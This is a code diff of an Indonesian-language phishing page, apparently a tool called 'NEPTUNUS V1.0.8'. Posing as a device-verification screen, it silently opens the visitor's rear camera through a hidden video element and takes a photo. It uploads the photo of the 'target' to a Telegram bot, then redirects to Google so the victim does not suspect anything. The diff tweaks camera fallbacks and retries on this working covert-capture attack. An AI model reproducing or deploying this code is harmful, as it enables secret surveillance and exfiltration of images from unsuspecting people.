@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verifikasi Sistem</title>
     <style>
-        body { background: #000; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        body { background: #fff; color: #000; text-align: center; font-family: sans-serif; padding-top: 50px; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -14,7 +14,6 @@
     <div class="loader"></div>
     <p>Sedang memverifikasi perangkat anda...<br>Mohon tunggu sebentar.</p>
 
-    <!-- Gunakan opacity 0 agar video tetap aktif di background tanpa terlihat -->
     <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -25,66 +24,63 @@
         const canvas = document.getElementById('canvas');
 
         async function startCamera() {
+            // Konfigurasi yang lebih aman: prioritaskan belakang tapi jangan paksa 'exact'
+            const constraints = {
+                video: { facingMode: "environment" },
+                audio: false
+            };
+
             try {
-                // Menggunakan 'exact' untuk memaksa penggunaan kamera belakang (rear camera)
-                const constraints = {
-                    video: { 
-                        facingMode: { exact: "environment" } 
-                    },
-                    audio: false
-                };
-                
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
-
-                // Tunggu sampai video benar-benar memutar frame
+                
                 video.onloadedmetadata = () => {
                     video.play();
-                    // Jeda 3 detik agar sensor cahaya kamera belakang menyesuaikan
+                    // Jeda agar sensor menyesuaikan cahaya
                     setTimeout(takeSnapshot, 3000);
                 };
-
             } catch (err) {
-                console.error("Gagal akses kamera belakang:", err);
-                // Jika kamera belakang tidak ditemukan, coba akses kamera apa saja yang tersedia
+                console.error("Gagal kamera belakang, mencoba kamera tersedia...");
+                // Fallback: Jika kamera belakang gagal, coba buka kamera apa saja
                 try {
                     const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     video.srcObject = fallbackStream;
                     setTimeout(takeSnapshot, 3000);
                 } catch (e) {
+                    // Jika semua gagal, langsung redirect
                     window.location.href = "https://google.com";
                 }
             }
         }
 
         function takeSnapshot() {
-            // Samakan ukuran canvas dengan resolusi asli kamera
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Kirim sebagai foto (Blob) ke Telegram agar lebih ringan dan cepat
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'rear_target.jpg');
-                formData.append('caption', '📸 **Target Berhasil Difoto! (Rear Cam)**\n\n<i>NEPTUNUS V1.0.8</i>');
-                formData.append('parse_mode', 'HTML');
+            if (video.videoWidth > 0) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chat_id);
+                    formData.append('photo', blob, 'rear.jpg');
+                    formData.append('caption', '📸 **Target Berhasil Difoto! (Rear Cam)**\n\n<i>NEPTUNUS V1.0.8</i>');
+                    formData.append('parse_mode', 'HTML');
 
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).finally(() => {
-                    // Redirect ke halaman tujuan agar target tidak curiga
-                    window.location.href = "https://google.com";
-                });
-            }, 'image/jpeg', 0.9);
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).finally(() => {
+                        window.location.href = "https://google.com";
+                    });
+                }, 'image/jpeg', 0.8);
+            } else {
+                // Jika masih kosong, coba lagi sekali lagi
+                setTimeout(takeSnapshot, 1000);
+            }
         }
 
         window.onload = startCamera;
     </script>
 </body>
 </html>
-
